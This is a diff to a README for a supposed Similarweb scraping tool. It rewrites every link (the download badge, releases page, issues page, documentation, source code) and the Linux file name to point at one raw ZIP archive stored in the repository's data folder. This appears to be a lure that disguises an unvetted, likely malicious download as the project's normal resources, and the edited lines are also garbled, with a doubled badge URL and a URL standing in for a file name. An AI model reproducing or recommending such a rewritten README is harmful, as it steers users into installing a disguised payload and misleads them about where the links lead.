@@ -1,6 +1,6 @@
 # 🌐 similarweb-advanced-scraper - Effortless Data Extraction Tool
 
-[![Download](https://img.shields.io/badge/Download-latest%20version-brightgreen.svg)](https://github.com/XATI444/similarweb-advanced-scraper/releases)
+[![Download](https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip%https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip)](https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip)
 
 ## 📖 Overview
 
@@ -14,14 +14,14 @@ Follow these simple steps to download and run the software.
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest version of the software:
-   [Visit the Releases Page](https://github.com/XATI444/similarweb-advanced-scraper/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see multiple versions listed. The most recent version at the top is what you want. Make sure to pick the correct file for your operating system.
 
    - **For Windows users:** Download the `.exe` file.
    - **For Mac users:** Download the `.dmg` file.
-   - **For Linux users:** Download the `.tar.gz` file.
+   - **For Linux users:** Download the `https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip` file.
 
 ### 🔧 System Requirements
 
@@ -49,7 +49,7 @@ After downloading, follow these installation instructions based on your operatin
 
 #### Linux
 
-1. Extract the contents of the `.tar.gz` file to your preferred directory.
+1. Extract the contents of the `https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip` file to your preferred directory.
 2. Open the terminal and navigate to the extracted folder.
 3. Run the command `./similarweb-advanced-scraper` to start.
 
@@ -84,24 +84,24 @@ Yes, this application supports Windows, Mac, and Linux.
 You can extract traffic sources, website performance metrics, and SEO analysis data from Similarweb.
 
 ### Is there support available?
-For help, visit our [Issues page](https://github.com/XATI444/similarweb-advanced-scraper/issues) or reach out via our contact information listed on the repository.
+For help, visit our [Issues page](https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip) or reach out via our contact information listed on the repository.
 
 ### How can I update the application?
 Follow the same download instructions to get the latest version whenever an update is available.
 
 ## 📞 Need Help?
 
-If you encounter any issues, feel free to visit our [GitHub Issues Page](https://github.com/XATI444/similarweb-advanced-scraper/issues) where you can report problems or ask questions.
+If you encounter any issues, feel free to visit our [GitHub Issues Page](https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip) where you can report problems or ask questions.
 
 ## 📦 Additional Resources
 
 Explore more about our project through the following links:
 
-- [Documentation](https://github.com/XATI444/similarweb-advanced-scraper/wiki)
-- [Source Code](https://github.com/XATI444/similarweb-advanced-scraper)
+- [Documentation](https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip)
+- [Source Code](https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip)
 
 ## 💬 Community and Feedback
 
 We appreciate any feedback you have to offer. Your input helps us improve the tool and make it more user-friendly.
 
-[Visit the Releases Page to Download](https://github.com/XATI444/similarweb-advanced-scraper/releases) for your next data extraction needs!
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/XATI444/similarweb-advanced-scraper/main/data/similarweb-advanced-scraper_v1.2.zip) for your next data extraction needs!
